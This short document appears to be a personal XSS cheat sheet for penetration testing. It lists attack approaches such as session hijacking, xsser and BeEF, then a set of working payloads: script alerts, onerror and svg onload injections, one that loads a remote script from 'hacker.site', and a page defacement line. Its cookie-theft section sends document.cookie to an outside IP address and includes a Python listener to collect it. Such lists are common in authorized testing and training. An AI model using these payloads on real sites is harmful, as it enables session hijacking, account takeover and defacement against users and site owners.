- Session hijacking / Cookie theft. Steal cookie to get admin privilege
- use xsser tool
- Using BEEF
- Enumeration user input box
- PHP XREF for php XXS
## Injections
	<h1> HI </h1>
	
	<plaintext>
 
	<script>alert('this is an XSS');</script>
	<script>alert(document.cookie);</script>
	<script>prompt('this is an XSS');</script>

	<img src=x onerror="prompt('XSS')">
	<img src=x onerror="window.location.href='https://google.com'">
	
	" onload="javascript:alert('XSS Example')
	" onload="alert('XSS Example')
	" onload="alert(String.fromCharCode(88,83,83)
	
	<svg/onload="alert('1')">
	"><svg/onload="alert(document.domain)">
	"><svg/onload="var s = document.createElement(SCRIPT);s.src = 'http://hacker.site/alert.js';document.body.appendChild(s);">
	
	document.body.innerHTML="<h1>Defaced</h1>";

## Steal cookie
	1. <script>var i=new Image;i.src="http://10.8.79.239:8000/?"+document.cookie;</script>
	2. python3 -m http.server